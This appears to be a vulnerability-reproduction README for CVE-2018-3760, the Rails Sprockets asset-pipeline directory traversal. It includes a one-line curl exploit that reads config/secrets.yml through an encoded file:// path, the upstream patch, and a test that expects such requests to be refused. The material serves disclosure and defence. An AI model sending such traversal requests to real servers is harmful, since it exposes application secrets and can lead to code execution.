# CVE-2018-3760

> Rails Asset Pipeline Directory Traversal Vulnerability 

Found by [Orange Tsai](https://twitter.com/orange_8361)

![image](https://user-images.githubusercontent.com/5891788/67213331-26e13380-f41e-11e9-80f4-86a5c9cd993d.png)

**Note**: By default, Rails apps running in production mode are not vulnerable to this exploit.

Exploit:

```
curl -v http://127.0.0.1:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/config/secrets.yml%3ftype=text/yaml
```

**Security analysis**

- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
- https://xz.aliyun.com/t/2542

**Security Advisory**

- https://blog.heroku.com/rails-asset-pipeline-vulnerability

# Patch

```patch
From c09131cf5b2c479263939c8582e22b98ed616c5f Mon Sep 17 00:00:00 2001
From: schneems <richard.schneeman+foo@gmail.com>
Date: Tue, 24 Apr 2018 16:37:53 -0500
Subject: [PATCH] Do not respond to http requests asking for a `file://`

Based on CVE-2018-3760 when the Sprockets server is accidentally being used in production, an attacker can pass in a specifically crafted url that will allow them access to view every file on the system. If the file hit contains a compilable extension such as `.erb` then the code in that file will be executed.

A Rails app will be using the Sprockets file server in production if they have accidentally configured their app to:

config.assets.compile = true # Your app is vulnerable

It is highly recommended to not use the Sprockets server in production and to instead precompile assets to disk and serve them through a server such as Nginx or via the static file middleware that ships with rails `config.public_file_server.enabled = true`.

This patch mitigates the issue, but explicitly disallowing any requests to uri resources via the server.
---
 lib/sprockets/server.rb | 2 +-
 test/test_server.rb     | 7 +++++++
 2 files changed, 8 insertions(+), 1 deletion(-)

diff --git a/lib/sprockets/server.rb b/lib/sprockets/server.rb
index 16edc4a4..5e5507c0 100644
--- a/lib/sprockets/server.rb
+++ b/lib/sprockets/server.rb
@@ -114,7 +114,7 @@ def forbidden_request?(path)
         #
         #     http://example.org/assets/../../../etc/passwd
         #
-        path.include?("..") || absolute_path?(path)
+        path.include?("..") || absolute_path?(path) || path.include?("://")
       end
 
       def head_request?(env)
diff --git a/test/test_server.rb b/test/test_server.rb
index d71bc999..b65ad809 100644
--- a/test/test_server.rb
+++ b/test/test_server.rb
@@ -286,6 +286,13 @@ def app
     assert_equal "", last_response.body
   end
 
+  test "illegal access of a file asset" do
+    absolute_path = fixture_path("server/app/javascripts")
+
+    get "assets/file:%2f%2f//#{absolute_path}/foo.js"
+    assert_equal 403, last_response.status
+  end
+
   test "add new source to tree" do
     filename = fixture_path("server/app/javascripts/baz.js")
 
```
